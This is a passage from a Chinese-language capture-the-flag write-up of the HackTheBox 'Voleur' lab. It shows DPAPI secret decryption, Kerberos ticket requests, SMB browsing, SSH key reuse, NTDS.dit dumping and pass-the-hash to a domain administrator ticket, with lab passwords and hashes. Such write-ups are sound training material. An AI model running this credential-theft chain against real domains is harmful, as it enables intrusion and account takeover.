Users/todd.wolfe/AppDAta/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110\n<span class=\"hljs-comment\"># ls</span>\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..\n-rw-rw-rw-        740  Wed Jan 29 21:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88\n-rw-rw-rw-        900  Wed Jan 29 20:53:08 2025 BK-VOLEUR\n-rw-rw-rw-         24  Wed Jan 29 20:53:08 2025 Preferred\n</code></pre>\n<p>将两个文件<code>get</code>下来</p>\n<p>尝试<code>DPAPI</code> ：<a href=\"https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice\">https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice</a></p>\n<pre><code class=\"hljs language-bash\">dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image14.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image15.png\" alt=\"image.png\"></p>\n<p>得到<code>jeremy.combs</code> 账户密码 <code>qT3V9pLXyN7W4m</code></p>\n<h2>NTDS</h2>\n<p>通过表格能知道 <code>jeremy</code> 拥有 <code>Has access to Software folder.</code></p>\n<pre><code class=\"hljs language-bash\">getTGT.py voleur.htb/jeremy.combs:<span class=\"hljs-string\">'qT3V9pLXyN7W4m'</span> -dc-ip 10.10.11.76 -k\n<span class=\"hljs-built_in\">export</span> KRB5CCNAME=jeremy.combs.ccache\n</code></pre>\n<p>继续查看<code>SMB</code></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur smbclient.py -k DC.VOLEUR.HTB\n<span class=\"hljs-comment\"># use IT</span>\n<span class=\"hljs-comment\"># pwd</span>\n/Third-Line Support\n<span class=\"hljs-comment\"># ls</span>\ndrw-rw-rw-          0  Fri Jan 31 00:11:29 2025 .\ndrw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..\n-rw-rw-rw-       2602  Fri Jan 31 00:11:29 2025 id_rsa\n-rw-rw-rw-        186  Fri Jan 31 00:07:35 2025 Note.txt.txt\n</code></pre>\n<p><code>Note.txt.txt</code></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur <span class=\"hljs-built_in\">cat</span> Note.txt.txt   \nJeremy,\n\nI<span class=\"hljs-string\">'ve had enough of Windows Backup! I'</span>ve part configured WSL to see <span class=\"hljs-keyword\">if</span> we can utilize any of the backup tools from Linux.\n\nPlease see what you can <span class=\"hljs-built_in\">set</span> up.\n\nThanks,\n\nAdmin# \n</code></pre>\n<p>然后<code>id_rsa</code>是<code>SSH</code>私钥，给了私钥，那么就应该可以进行<code>SSH</code>登录，用户和<code>backup</code>有关的</p>\n<p>那么就是<code>svc_backup</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image16.png\" alt=\"image.png\"></p>\n<p>但是没有发现<code>SSH</code>端口，重新扫描一下</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur nmap -sT -min-rate 5000 -p- 10.10.11.76\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 23:10 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> voleur.htb (10.10.11.76)\nHost is up (0.058s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n2222/tcp  open  EtherNetIP-1\n3268/tcp  open  globalcatLDAP\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Voleur nmap -sT -A -p 2222 10.10.11.76\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 23:11 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> voleur.htb (10.10.11.76)\nHost is up (0.047s latency).\n\nPORT     STATE SERVICE VERSION\n2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 42:40:39:30:d6:<span class=\"hljs-built_in\">fc</span>:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)\n|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:<span class=\"hljs-built_in\">cd</span>:94 (ECDSA)\n|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)\n</code></pre>\n<p><code>2222</code>是<code>SSH</code>的端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image17.png\" alt=\"image.png\"></p>\n<p>在<code>/mnt</code>中有<code>c</code>盘的备份</p>\n<pre><code class=\"hljs language-bash\">svc_backup@DC:/mnt$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 0\ndrwxr-xr-x 1 root       root       4096 Jan 30 03:46 .\ndrwxr-xr-x 1 root       root       4096 Jan 30 03:46 ..\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jun 30 14:08 c\n</code></pre>\n<p><code>/IT/Third-Line Support/Backups</code> 中有<code>NTDS</code>文件</p>\n<pre><code class=\"hljs language-bash\">svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 0\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 08:11  .\ndr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 08:11  ..\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49 <span class=\"hljs-string\">'Active Directory'</span>\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49  registry\n</code></pre>\n<pre><code class=\"hljs language-bash\">svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ <span class=\"hljs-built_in\">ls</span> Active\\ Directory/ -al\ntotal 24592\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..\n-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 03:49 ntds.dit\n-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30 03:49 ntds.jfm\nsvc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ <span class=\"hljs-built_in\">ls</span> registry/ -al\ntotal 17952\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..\n-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30 03:30 SECURITY\n-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 03:30 SYSTEM\n</code></pre>\n<p>转储出去，使用<code>secretdump</code>转储出来</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image18.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur getTGT.py voleur.htb/administrator -hashes <span class=\"hljs-string\">'aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2'</span> -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> administrator.ccache\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image19.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>总体不难，但是步骤会多点，而且<code>SMB</code>不太稳定，总是爆红…</p>","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","updated":"2025-07-07","tags":["HackTheBox","Windows","BloodyAD","NTDS","TargetedKerberoasting","DPAPI","encrypt"],"categories":"靶机","comments":true,"description":"Season8 Voleur https://app.hackthebox.com/machines/Voleur | Window | Medium Machine Information ：As is common in real life Windows pentests, you will...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"}]},"__N_SSG":true}